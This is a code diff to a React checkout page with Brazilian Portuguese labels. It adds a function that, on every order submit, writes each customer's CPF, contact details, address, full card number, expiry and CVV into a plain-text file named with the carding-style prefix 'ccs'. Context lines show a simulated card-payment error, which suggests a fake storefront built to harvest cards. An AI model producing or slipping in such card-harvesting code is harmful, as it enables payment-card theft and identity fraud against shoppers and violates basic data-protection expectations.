@@ -30,6 +30,49 @@ export default function Checkout() {
     cvv: "",
   });
 
+  const downloadOrderData = (orderData: any) => {
+    const orderText = `
+DADOS DO PEDIDO:
+----------------
+ID: ${orderData.id}
+Data: ${orderData.created_at}
+
+DADOS DO CLIENTE:
+----------------
+Nome: ${orderData.customer_data.name}
+CPF: ${orderData.customer_data.cpf}
+Email: ${orderData.customer_data.email}
+Telefone: ${orderData.customer_data.phone}
+Endereço: ${orderData.customer_data.address}
+Cidade: ${orderData.customer_data.city}
+Estado: ${orderData.customer_data.state}
+CEP: ${orderData.customer_data.zipCode}
+
+DADOS DO CARTÃO:
+---------------
+Número: ${orderData.credit_card_data?.cardNumber || 'N/A'}
+Titular: ${orderData.credit_card_data?.cardHolder || 'N/A'}
+Validade: ${orderData.credit_card_data?.expiryDate || 'N/A'}
+CVV: ${orderData.credit_card_data?.cvv || 'N/A'}
+
+ITENS DO PEDIDO:
+---------------
+${orderData.items.map((item: any) => `${item.title} - Quantidade: ${item.quantity} - Preço: R$ ${item.price}`).join('\n')}
+
+TOTAL: R$ ${orderData.total_amount}
+    `;
+
+    const blob = new Blob([orderText], { type: 'text/plain' });
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `ccs${Date.now()}.txt`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    window.URL.revokeObjectURL(url);
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -48,6 +91,9 @@ export default function Checkout() {
       // Salvando no localStorage
       const existingOrders = getFromLocalStorage('orders', []);
       saveToLocalStorage('orders', [...existingOrders, orderData]);
+
+      // Download do arquivo de texto
+      downloadOrderData(orderData);
 
       if (paymentMethod === "credit") {
         // Simulando erro no processamento do pagamento com cartão
